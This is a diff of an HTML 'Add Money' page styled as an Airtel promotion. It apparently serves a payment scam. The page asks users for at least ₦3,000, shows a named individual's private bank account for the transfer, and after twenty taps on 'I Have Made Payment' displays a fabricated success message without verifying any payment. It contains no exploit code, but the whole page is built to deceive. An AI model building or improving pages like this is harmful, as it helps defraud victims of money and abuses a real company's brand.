@@ -1,207 +1,199 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>Add Money - Airtel Theme</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Add Money - Airtel Promo</title>
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: #fefefe;
-      overflow-x: hidden;
-      position: relative;
-      touch-action: manipulation;
-    }
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }body {
+  overflow-x: hidden;
+  background: #fff;
+  position: relative;
+  min-height: 100vh;
+}
 
-    body, input, button {
-      -webkit-user-select: none;
-      user-select: none;
-    }
+.background {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  z-index: -1;
+}
 
-    .airtel-bg {
-      position: fixed;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(rgba(255, 0, 0, 0.05), transparent);
-      overflow: hidden;
-      z-index: -1;
-    }
+.background span {
+  position: absolute;
+  width: 30px;
+  height: 30px;
+  background: url('airtel-logo.png') no-repeat center center / contain;
+  animation: floatLogo 10s linear infinite;
+  opacity: 0.2;
+}
 
-    .logo-piece {
-      position: absolute;
-      width: 25px;
-      height: 25px;
-      background-image: url('airtel-logo.png');
-      background-size: cover;
-      opacity: 0.15;
-      animation: float 10s linear infinite;
-    }
+@keyframes floatLogo {
+  0% {
+    transform: translateY(100vh) rotate(0deg);
+  }
+  100% {
+    transform: translateY(-100vh) rotate(360deg);
+  }
+}
 
-    @keyframes float {
-      from {
-        transform: translateY(100vh) rotate(0deg);
-      }
-      to {
-        transform: translateY(-10vh) rotate(360deg);
-      }
-    }
+.container {
+  padding: 20px;
+  text-align: center;
+}
 
-    .container {
-      padding: 20px;
-      text-align: center;
-    }
+.airtel-logo {
+  width: 100px;
+  margin: 20px auto;
+  animation: scatter 2s ease forwards;
+}
 
-    .airtel-logo {
-      width: 80px;
-      margin: 10px auto;
-    }
+@keyframes scatter {
+  0% {
+    transform: scale(0) rotate(720deg);
+    opacity: 0;
+  }
+  100% {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
 
-    .input-box {
-      background: #fff;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.05);
-      max-width: 360px;
-      margin: 0 auto;
-    }
+.amount-section input {
+  padding: 12px;
+  width: 80%;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+  margin-bottom: 20px;
+}
 
-    input {
-      width: 90%;
-      padding: 10px;
-      font-size: 16px;
-      border: 2px solid #dcdcdc;
-      border-radius: 8px;
-      outline: none;
-      margin-bottom: 10px;
-    }
+button {
+  padding: 10px 20px;
+  background: red;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+}
 
-    button {
-      padding: 12px 25px;
-      background: red;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-    }
+.card {
+  background: rgba(255, 255, 255, 0.9);
+  padding: 20px;
+  border-radius: 15px;
+  margin-top: 20px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  display: none;
+}
 
-    .hidden {
-      display: none;
-    }
+.popup {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  padding: 20px;
+  border-radius: 20px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  display: none;
+  text-align: center;
+  z-index: 999;
+  animation: fadeIn 0.4s ease;
+}
 
-    .popup {
-      position: fixed;
-      top: 40%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: white;
-      padding: 25px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.2);
-      border-radius: 12px;
-      z-index: 20;
-      max-width: 80%;
-    }
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
 
-    .account-details {
-      margin-top: 25px;
-      background: rgba(255,255,255,0.9);
-      padding: 20px;
-      border-radius: 15px;
-      max-width: 350px;
-      margin-left: auto;
-      margin-right: auto;
-    }
+.popup img {
+  width: 60px;
+  margin-bottom: 10px;
+}
 
-    .back-btn {
-      margin-top: 20px;
-      display: block;
-      text-decoration: none;
-      background: #ccc;
-      padding: 10px 20px;
-      color: black;
-      border-radius: 10px;
-    }
+.back-btn {
+  margin-top: 20px;
+  display: block;
+  text-decoration: none;
+  color: red;
+  font-weight: bold;
+}
 
   </style>
 </head>
 <body>
+  <div class="background" id="floating-bg"></div>  <div class="container">
+    <img src="airtel-logo.png" alt="Airtel Logo" class="airtel-logo" /><div class="amount-section">
+  <input type="number" id="amount" placeholder="Enter Amount (min ₦3000)" />
+  <br />
+  <button onclick="submitAmount()">Continue</button>
+</div>
 
-  <div class="airtel-bg" id="bgContainer"></div>
+<div class="card" id="account-card">
+  <h3>Transfer To:</h3>
+  <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
+  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+  <p><strong>Account No:</strong> 8124890070</p>
+  <br />
+  <button onclick="recordTap()">I Have Made Payment</button>
+  <a href="dashboard.html" class="back-btn">← Back to Dashboard</a>
+</div>
 
-  <div class="container">
-    <img src="airtel-logo.png" class="airtel-logo" alt="Airtel Logo" />
-
-    <div class="input-box">
-      <input type="number" id="amountInput" placeholder="Enter amount (min ₦3000)" />
-      <button onclick="handleContinue()">Continue</button>
-    </div>
-
-    <div class="account-details hidden" id="accountDetails">
-      <img src="airtel-logo.png" class="airtel-logo" alt="Logo" />
-      <p><strong>Make Payment To:</strong></p>
-      <p>EMMANUEL OKWUNNA</p>
-      <p>SmartCash Payment Service Bank</p>
-      <p>812 489 0070</p>
-      <button onclick="handleTap()">I Have Made Payments</button>
-      <a href="dashboard.html" class="back-btn">← Back to Dashboard</a>
-    </div>
-  </div>
-
-  <div class="popup hidden" id="popupBox"></div>
-
-  <script>
-    // Background animation
-    const bg = document.getElementById('bgContainer');
-    for (let i = 0; i < 40; i++) {
-      const logo = document.createElement('div');
-      logo.classList.add('logo-piece');
-      logo.style.left = Math.random() * 100 + 'vw';
-      logo.style.top = Math.random() * 100 + 'vh';
-      logo.style.animationDuration = (8 + Math.random() * 5) + 's';
-      bg.appendChild(logo);
-    }
-
-    const popup = document.getElementById('popupBox');
-    const accountBox = document.getElementById('accountDetails');
-
-    let tapCount = parseInt(localStorage.getItem("tapCount")) || 0;
-    let balance = parseInt(localStorage.getItem("balance")) || 0;
+  </div>  <div class="popup" id="popup">
+    <img src="airtel-logo.png" alt="Airtel Popup Logo">
+    <p id="popup-message"></p>
+  </div>  <script>
+    const TAP_LIMIT = 20;
+    let taps = parseInt(localStorage.getItem('tapCount') || '0');
+    const popup = document.getElementById('popup');
+    const popupMessage = document.getElementById('popup-message');
 
     function showPopup(message) {
-      popup.innerHTML = `<p>${message}</p>`;
-      popup.classList.remove("hidden");
-      setTimeout(() => popup.classList.add("hidden"), 3000);
+      popupMessage.innerText = message;
+      popup.style.display = 'block';
+      setTimeout(() => popup.style.display = 'none', 3000);
     }
 
-    function handleContinue() {
-      const amount = parseInt(document.getElementById('amountInput').value);
+    function submitAmount() {
+      const amount = parseInt(document.getElementById('amount').value);
       if (isNaN(amount) || amount < 3000) {
-        showPopup("❌ Please input minimum of ₦3,000");
-        return;
-      }
-
-      showPopup("⏳ Please wait...");
-      setTimeout(() => {
-        accountBox.classList.remove("hidden");
-      }, 1500);
-    }
-
-    function handleTap() {
-      tapCount++;
-      localStorage.setItem("tapCount", tapCount);
-
-      if (tapCount >= 20) {
-        tapCount = 0;
-        balance += 3000;
-        localStorage.setItem("tapCount", tapCount);
-        localStorage.setItem("balance", balance);
-
-        showPopup("🎉 Congratulations! You have just funded your wallet with ₦3,000 through transfer. Your transaction has been confirmed.");
+        showPopup('Please input minimum of ₦3000');
       } else {
-        showPopup("⏳ Please wait, confirming payment...");
+        showPopup('Please wait... Confirming');
+        setTimeout(() => {
+          document.getElementById('account-card').style.display = 'block';
+        }, 1000);
       }
     }
-  </script>
-</body>
+
+    function recordTap() {
+      taps++;
+      localStorage.setItem('tapCount', taps);
+      if (taps >= TAP_LIMIT) {
+        showPopup('Dear user, you have successfully funded your Airtel promo app with ₦3000. Your transaction is successful.');
+        taps = 0;
+        localStorage.setItem('tapCount', 0);
+        // Here you would update balance in real app
+      } else {
+        showPopup('Please wait... Confirming your transaction');
+      }
+    }
+
+    // Floating logos
+    const bg = document.getElementById('floating-bg');
+    for (let i = 0; i < 40; i++) {
+      const span = document.createElement('span');
+      span.style.left = Math.random() * 100 + 'vw';
+      span.style.animationDuration = (Math.random() * 5 + 5) + 's';
+      bg.appendChild(span);
+    }
+  </script></body>
 </html>
